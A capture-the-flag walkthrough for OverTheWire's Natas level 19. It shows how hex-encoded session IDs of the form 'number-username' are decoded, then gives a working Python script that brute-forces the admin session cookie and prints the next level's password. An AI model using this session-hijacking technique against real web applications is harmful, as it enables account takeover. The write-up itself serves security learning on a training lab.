# Natas19

## Level Description
- **Username**: natas19
- **Password**: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
- **URL**: http://natas19.natas.labs.overthewire.org

## Method of Solving
![image-1](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas19/image-1.png)

Here, we don't have the source code but the challenge says: "This page use mostly the same code as the previous level, but session IDs are no longer sequential...". Let's take a look at our cookie with the login information is `username`='natas19', `password`='password'.
```bash
PHPSESSID:"3136352d6e617461733139"
```
It looks like ASCII, let's decode it:
```bash
165-natas19
```
It looks like this app is still using the same method of assigning session IDs to be used as cookies, but a dash and the name of the user is appended.

So what we need to do we run the same script as the last level, but after generating the number in the range, prepend it to "-admin" and then convert it to hexadecimal before sending each request. This script should do the job:
```bash
#!/bin/python3

import requests

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr") #Replace with target creds

for session_id in range(1, 641):
	format_session_id = str(session_id)+'-admin'
	encode_session_id = format_session_id.encode('utf-8').hex()
	#print(f"Current cookie: {encode_session_id}")
	cookies = {"PHPSESSID":str(encode_session_id)}
	response = requests.get(url, auth=auth, cookies=cookies)
	
	if "You are an admin" in response.text:
		print(f"Admin session found! PHPSESSID={session_id}")
		print(response.text)
		break
		
```
Here this is the result:
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/overthewire/natas/natas19]
└─$ python3 natas19_brute_force.py
Admin session found! PHPSESSID=281
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
</body>
</html>
```
***You are welcome!***
